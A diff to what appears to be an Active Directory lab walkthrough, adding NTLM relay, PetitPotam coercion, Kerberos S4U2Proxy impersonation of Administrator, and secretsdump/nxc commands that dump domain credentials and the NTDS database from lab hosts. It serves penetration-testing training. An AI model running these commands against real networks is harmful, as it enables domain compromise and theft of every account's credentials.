@@ -87,6 +87,15 @@ Forge un ticket Kerberos pour un utilisateur ciblé via S4U2Proxy en exploitant 
 impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/relayedpccreate$:ttrJB6qsD;B3BSn'
 ```
 
+DCSync by presenting the service ticket
+
+```bash
+export KRB5CCNAME=/home/pentester/Tools/Administrator.ccache
+secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
+nxc smb meereen.essos.local -k --use-kcache
+nxc smb meereen.essos.local -k --use-kcache --ntds
+```
+
 If we specify a loot dir all the informations on the ldap are automatically dumped
 
 ```
@@ -98,7 +107,7 @@ ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -
 Start the relay with remove mic to the ldaps of meereen.essos.local.
 
 ```bash
-ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --delegate-access
+ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --delegate-access
 ```
 
 Run the coerce authentication on braavos (braavos is a windows server 2016 up to date so petitpotam unauthenticated will not work here)
@@ -110,12 +119,14 @@ python3 PetitPotam.py -u khal.drogo -p horse 192.168.56.129 braavos.essos.local
 The attack worked we can now exploit braavos with RBCD
 
 ```bash
-getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/removemiccomputer$:_53>W3){OkTY{ej'
+impacket-getST -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS/AUTBHVFM$:uvEGGJ+$7g3}Bb*'
 ```
 
-And use that ticket to retreive secrets
+DCSync by presenting the service ticket
 
 ```bash
 export KRB5CCNAME=/home/pentester/Tools/Administrator.ccache
 secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
+nxc smb meereen.essos.local -k --use-kcache
+nxc smb meereen.essos.local -k --use-kcache --ntds
 ```
